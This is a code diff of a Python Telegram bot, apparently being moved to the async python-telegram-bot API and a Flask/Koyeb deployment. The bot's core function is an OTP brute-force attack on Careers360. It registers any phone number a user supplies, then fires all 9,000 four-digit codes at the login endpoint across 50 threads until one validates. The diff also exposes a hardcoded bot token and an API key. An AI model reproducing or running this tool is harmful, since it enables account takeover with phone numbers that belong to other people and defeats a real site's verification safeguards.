@@ -2,14 +2,14 @@ import requests
 import concurrent.futures
 import random
 import time
+import os
+from flask import Flask
 from telegram import Update
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
 
-# Telegram Bot Token
-TOKEN = "7810054325:AAFNvA74woOJL95yU7ZeBHIzI7SatP6d3HE"
-
-# Headers for requests
-headers = {
+# Load environment variables (set in Koyeb)
+TOKEN = os.getenv("BOT_TOKEN")  # Telegram Bot Token
+HEADERS = {
     "Accept": "application/json, text/plain, */*",
     "x-api-key": "xeJJzhaj1mQ-ksTB_nF_iH0z5YdG50yQtwQCzbcHuKA",
     "device-type": "mobile",
@@ -18,133 +18,125 @@ headers = {
     "Content-Type": "application/json"
 }
 
-ask_me_links = [
+# Flask app for deployment
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return "Telegram Bot is Running!"
+
+# AskMe links
+ASK_ME_LINKS = [
     "ebooks/jee-main-preparation-tips-complete-strategy-study-plan",
     "ebooks/jee-main-highest-scoring-chapters-and-topics"
 ]
 
-# Start command
-def start(update: Update, context: CallbackContext):
-    update.message.reply_text("Send /op to start the process.")
+# Telegram Bot Functionality
+async def op(update: Update, context: CallbackContext):
+    await update.message.reply_text("Enter details in format: {number} - {Name} - {email}")
 
-# OTP Login process
-def op(update: Update, context: CallbackContext):
+async def message_handler(update: Update, context: CallbackContext):
+    user_input = update.message.text
     chat_id = update.message.chat_id
-    update.message.reply_text("Enter details in format: {number} - {Name} - {email}")
 
-    # Wait for user response
-    context.user_data["waiting_for_details"] = True
+    try:
+        mobile_number, user_name, user_email = map(str.strip, user_input.split("-"))
+    except ValueError:
+        await update.message.reply_text("❌ Invalid input format! Use {number} - {Name} - {email}")
+        return
 
-def handle_message(update: Update, context: CallbackContext):
-    if context.user_data.get("waiting_for_details"):
-        context.user_data["waiting_for_details"] = False
-        user_input = update.message.text.strip()
-        
-        try:
-            mobile_number, user_name, user_email = map(str.strip, user_input.split("-"))
-        except ValueError:
-            update.message.reply_text("❌ Invalid format! Please use {number} - {Name} - {email}.")
-            return
+    ask_me = random.choice(ASK_ME_LINKS)
 
-        msg = update.message.reply_text("Otp Sent - 👍")
+    # Send OTP
+    otp_url = "https://backend-cus.careers360.com/api/1/cus/otp-send"
+    otp_data = {
+        "otp_on": "mobile",
+        "cta_clicked": "signup",
+        "otp_action": "send",
+        "isd_code": "+91",
+        "mobile_number": mobile_number
+    }
 
-        # OTP request
-        otp_url = "https://backend-cus.careers360.com/api/1/cus/otp-send"
-        otp_data = {
-            "otp_on": "mobile",
-            "cta_clicked": "signup",
-            "otp_action": "send",
-            "isd_code": "+91",
-            "mobile_number": mobile_number
-        }
-        otp_response = requests.post(otp_url, json=otp_data, headers=headers)
+    response = requests.post(otp_url, json=otp_data, headers=HEADERS)
 
-        if otp_response.status_code == 200 and otp_response.json().get("result"):
-            msg.edit_text("Signup Successfull - 👍")
-        else:
-            msg.edit_text("❌ OTP Sending Failed")
-            return
+    if response.status_code == 200 and response.json().get("result"):
+        message = await update.message.reply_text("✅ OTP Sent - 👍")
+    else:
+        await update.message.reply_text("❌ OTP Sending Failed")
+        return
 
-        # Signup process
-        signup_url = "https://backend-cus.careers360.com/api/1/cus/signup"
-        signup_data = {
-            "current_url": f"https://engineering.careers360.com/download/{random.choice(ask_me_links)}",
-            "destination": f"https://engineering.careers360.com/download/{random.choice(ask_me_links)}",
-            "cta_clicked": "signup",
-            "country_code": "+91",
-            "mobile_number": mobile_number,
-            "email": user_email,
-            "name": user_name,
-            "submit": True
-        }
-        signup_response = requests.post(signup_url, json=signup_data, headers=headers)
+    # Signup Request
+    signup_url = "https://backend-cus.careers360.com/api/1/cus/signup"
+    signup_data = {
+        "current_url": f"https://engineering.careers360.com/download/{ask_me}",
+        "destination": f"https://engineering.careers360.com/download/{ask_me}",
+        "cta_clicked": "signup",
+        "country_code": "+91",
+        "mobile_number": mobile_number,
+        "email": user_email,
+        "name": user_name,
+        "passing_year": 2025,
+        "degree_interested": 2,
+        "domain_id": 1
+    }
 
-        if signup_response.status_code == 200 and signup_response.json().get("result"):
-            user_uuid = signup_response.json()["data"].get("user_uuid")
-        else:
-            msg.edit_text("❌ Signup failed.")
-            return
+    signup_response = requests.post(signup_url, json=signup_data, headers=HEADERS)
 
-        # Brute-force OTPs
-        login_url = "https://backend-cus.careers360.com/api/1/cus/login"
-        found_otp = None
-        checked_otps = 0
+    if signup_response.status_code == 200 and signup_response.json().get("result"):
+        user_uuid = signup_response.json()["data"].get("user_uuid")
+        await message.edit_text("✅ Signup Successful - 👍")
+    else:
+        await message.edit_text("❌ Signup Failed")
+        return
 
-        def try_otp(otp):
-            nonlocal found_otp, checked_otps
-            if found_otp:
-                return None
+    # Brute-force OTPs
+    login_url = "https://backend-cus.careers360.com/api/1/cus/login"
+    found_otp = None
+    checked_otps = 0
 
-            login_data = {
-                "current_url": f"https://engineering.careers360.com/download/{random.choice(ask_me_links)}",
-                "destination": f"https://engineering.careers360.com/download/{random.choice(ask_me_links)}",
-                "otp_on": "mobile",
-                "country_code": "+91",
-                "mobile_number": mobile_number,
-                "otp": otp,
-                "user_uuid": user_uuid
-            }
-
-            login_response = requests.post(login_url, json=login_data, headers=headers)
-
-            if login_response.status_code == 200 and login_response.json()["data"].get("otp_response") is True:
-                found_otp = otp
-                return otp
-
-            checked_otps += 1
-            if checked_otps % 100 == 0:
-                msg.edit_text(f"Otp - Checked {checked_otps}")
-
+    def try_otp(otp):
+        nonlocal found_otp, checked_otps
+        if found_otp:
             return None
 
-        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
-            otp_range = range(1000, 10000)
-            future_to_otp = {executor.submit(try_otp, otp): otp for otp in otp_range}
+        login_data = {
+            "current_url": f"https://engineering.careers360.com/download/{ask_me}",
+            "destination": f"https://engineering.careers360.com/download/{ask_me}",
+            "otp_on": "mobile",
+            "country_code": "+91",
+            "mobile_number": mobile_number,
+            "otp": otp,
+            "user_uuid": user_uuid
+        }
 
-            for future in concurrent.futures.as_completed(future_to_otp):
-                if found_otp:
-                    executor.shutdown(wait=False)
-                    break
+        login_response = requests.post(login_url, json=login_data, headers=HEADERS)
 
-        if not found_otp:
-            msg.edit_text("❌ OTP brute-force failed.")
-            return
+        if login_response.status_code == 200 and login_response.json()["data"].get("otp_response"):
+            found_otp = otp
+            return otp
 
-        msg.edit_text(f"Valid Otp - {found_otp}")
-        time.sleep(1)
-        msg.edit_text("Login Successfull - 👍")
+        checked_otps += 1
+        return None
 
-# Telegram bot setup
-def main():
-    updater = Updater(TOKEN, use_context=True)
-    dp = updater.dispatcher
+    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+        for otp in range(1000, 10000):
+            if found_otp:
+                break
+            executor.submit(try_otp, otp)
 
-    dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(CommandHandler("op", op))
-    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
+    if found_otp:
+        await message.edit_text(f"✅ Valid OTP Found: {found_otp} - 👍")
+        await message.edit_text("✅ Login Successful - 👍")
+    else:
+        await message.edit_text("❌ Login Failed")
 
-    updater.start_polling()
-    updater.idle()
+# Initialize Telegram Bot
+async def main():
+    app = Application.builder().token(TOKEN).build()
+    app.add_handler(CommandHandler("op", op))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
+    await app.run_polling()
 
 if __name__ == "__main__":
-    main()
+    import asyncio
+    asyncio.run(main())
